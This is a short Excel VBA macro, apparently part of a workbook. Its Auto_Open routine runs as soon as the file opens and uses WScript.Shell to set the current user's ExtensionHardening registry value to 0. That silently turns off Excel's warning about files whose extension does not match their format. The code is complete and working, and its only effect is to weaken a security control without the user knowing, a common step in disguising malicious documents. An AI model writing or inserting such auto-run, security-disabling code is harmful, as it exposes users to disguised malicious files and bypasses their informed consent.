Sub A02_Auto_Open()
  CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Office\" _
            & Val(Application.Version) & ".0" _
            & "\Excel\Security\ExtensionHardening", 0, "REG_DWORD"
End Sub
